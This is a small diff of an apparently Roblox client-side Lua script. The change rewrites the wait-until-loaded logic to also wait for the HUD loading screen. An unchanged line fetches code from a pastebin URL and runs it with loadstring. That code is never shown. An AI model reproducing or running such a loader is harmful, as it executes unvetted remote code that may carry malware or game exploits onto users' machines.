@@ -1,6 +1,6 @@
-while game.Loaded do
-    task.wait()
-end
+repeat task.wait() until game:IsLoaded()
+repeat task.wait() until game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("HUD",1000000):WaitForChild("Screen",10).LoadingScreen.Visible == false
+wait()
 
 loadstring(game:HttpGetAsync("https://pastebin.com/raw/tVb04TfW"))()
 math.randomseed(os.time())
